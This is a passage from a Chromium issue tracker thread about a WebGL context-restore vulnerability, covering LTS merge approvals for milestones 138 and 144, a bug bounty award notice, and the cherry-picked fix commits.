    Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#2370} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.h`
- M `third_party/blink/renderer/modules/webgl/webgl_object.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_object.h`
- M `third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.h`

---

Hash: [50b057660b4d37e050269c23c017e303e6104506](https://chromiumdash.appspot.com/commit/50b057660b4d37e050269c23c017e303e6104506)  

Date: Wed Mar 11 21:52:44 2026


---

### pe...@google.com (2026-03-11)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ka...@chromium.org (2026-03-11)

1. No
2. No

### pe...@google.com (2026-03-12)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-12)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7656489
2. Low - There was no conflict.
3. 146
4. Yes, the bug has existed long years ago according to the description[1]. Also, M138 has the other suspected CL[2]. Thus, I think M138 needs to have the fix.

[1] https://codereview.chromium.org/1300573002
[2] https://chromium-review.git.corp.google.com/c/chromium/src/+/6251718

### ka...@chromium.org (2026-03-12)

> 4. Yes, the bug has existed long years ago according to the description[1]. Also, M138 has the other suspected CL[2]. Thus, I think M138 needs to have the fix.

We think that turned out to be wrong, and the bug has only existed for one year - the autobisect in [comment#5](https://issues.chromium.org/issues/485935305#comment5) determined this (pointing to the CL[2] you linked).

### ka...@chromium.org (2026-03-12)

But yes M138 definitely has the bug, that landed in M135.

### qk...@google.com (2026-03-18)

kainino@chromium.org: Thank you for checking the comments and verifying M138 has the bug. Then, we will cherry-pick the fix to M138 after getting an approval.

### pe...@google.com (2026-03-18)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-19)

1. https://chromium-review.git.corp.google.com/c/chromium/src/+/7673161
2. Low - There was no conflict.
3. 146
4. Yes,  the bug was introduced by this CL[1] one year ago according to comment #5. And M144 doesn't have the patch[2] to fix the bug.

[1] https://chromium-review.git.corp.google.com/c/chromium/src/+/6251718
[2] https://chromium-review.git.corp.google.com/c/chromium/src/+/7630664

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $90000.00 for this report.

Rationale for this decision:
High-quality report demonstrating controlled write in an unsandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### an...@google.com (2026-03-27)

Approved for LTS 138 and 144.

### ka...@chromium.org (2026-03-30)

The `Merge Approval` lint does not appear to understand `Chromium Labels: LTS-Merge-Approved-*` labels. I am manually adding the matching `Merge: Approved-*` labels to see if it understands those.

### ka...@chromium.org (2026-03-30)

Never mind, I think the fact that the `Merge Approval` check is failing doesn't matter? The bot removed `Lint -1` already.

### dx...@google.com (2026-03-30)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Kai Ninomiya [kainino@chromium.org](mailto:kainino@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7673161>

[M144-LTS] Increment WebGL context generation number on context restore

---


Expand for full commit details
```
     
    Objects created while the context is lost should not be valid to use 
    after the context is restored. 
    - Replace number_of_context_losses_ with a "context generation number" 
      which increments on both context loss and context restore. 
      - Technically, it would make sense to increment it only on context 
        restore, but just in case any logic is relying on the current 
        behavior, increment it in both places. 
      - It's uint64_t just in case someone figures out how to increment it 4 
        billion times. 
    - Remove unused WebGLRenderingContextBase::number_of_context_losses_, 
      left over from before it was moved into WebGLContextObjectSupport. 
     
    (cherry picked from commit c1433740f3ea902fd6b15d63c4865ad60a3761f9) 
     
    Bug: 485935305 
    Change-Id: I1007217c8e69cfb8de4f117e0b7845ca574579c4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7630664 
    Reviewed-by: Kenneth Russell <kbr@chromium.org> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1593726} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7673161 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4806} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.h`
- M `third_party/blink/renderer/modules/webgl/webgl_object.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_object.h`
- M `third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.h`

---

Hash: [eed3706f6a38ab2c0544dbcfc8a947ad06126fdf](https://chromiumdash.appspot.com/commit/eed3706f6a38ab2c0544dbcfc8a947ad06126fdf)  

Date: Mon Mar 30 22:17:05 2026


---

### dx...@google.com (2026-03-31)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Kai Ninomiya [kainino@chromium.org](mailto:kainino@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7656489>

[M138-LTS] Increment WebGL context generation number on context restore

---


Expand for full commit details
```
     
    Objects created while the context is lost should not be valid to use 
    after the context is restored. 
    - Replace number_of_context_losses_ with a "context generation number" 
      which increments on both context loss and context restore. 
      - Technically, it would make sense to increment it only on context 
        restore, but just in case any logic is relying on the current 
        behavior, increment it in both places. 
      - It's uint64_t just in case someone figures out how to increment it 4 
        billion times. 
    - Remove unused WebGLRenderingContextBase::number_of_context_losses_, 
      left over from before it was moved into WebGLContextObjectSupport. 
     
    (cherry picked from commit c1433740f3ea902fd6b15d63c4865ad60a3761f9) 
     
    Bug: 485935305 
    Change-Id: I1007217c8e69cfb8de4f117e0b7845ca574579c4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7630664 
    Reviewed-by: Kenneth Russell <kbr@chromium.org> 
    Commit-Queue: Kai Ninomiya <kainino@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1593726} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7656489 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3507} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_context_object_support.h`
- M `third_party/blink/renderer/modules/webgl/webgl_object.cc`
- M `third_party/blink/renderer/modules/webgl/webgl_object.h`
- M `third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.h`

---

Hash: [60f004b9264e8223f0fa6ca2b058574acfa51498](https://chromiumdash.appspot.com/commit/60f004b9264e8223f0fa6ca2b058574acfa51498)  

Date: Tue Mar 31 08:39:32 2026


---

### ch...@google.com (2026-06-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485935305)*
